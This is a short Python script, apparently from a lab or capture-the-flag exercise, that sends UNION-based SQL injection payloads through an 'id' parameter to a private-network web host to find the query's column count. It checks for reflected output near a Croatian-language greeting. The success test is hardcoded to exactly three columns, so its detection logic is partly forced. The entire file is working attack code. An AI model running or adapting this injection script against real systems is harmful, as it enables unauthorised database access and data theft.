import requests
import re

url = "http://192.168.119.3:8091/"

for columns in range(1, 6):
    payload = f"-1 union select {','.join([str(i) for i in range(1, columns+1)])}"
    params = {'id': payload}
    
    print(f"[*] Trying {columns} columns: {payload}")
    response = requests.get(url, params=params)
    
    # Look for the pattern that indicates the UNION data is showing
    # The numbers would appear in the HTML where username normally goes
    if "2" in response.text and columns == 3:  # Force check only at 3
        print(f"\n[!!!] SUCCESS! {columns} columns works!")
        print(f"Working payload: {payload}")
        break
    elif columns == 3:
        print("[DEBUG] At 3 columns - checking response:")
        # Print a snippet around where the username would appear
        match = re.search(r'Dobrodošao, (.*?)!', response.text)
        if match:
            print(f"Username field contains: {match.group(1)}")
else:
    print("[-] Could not find working column count")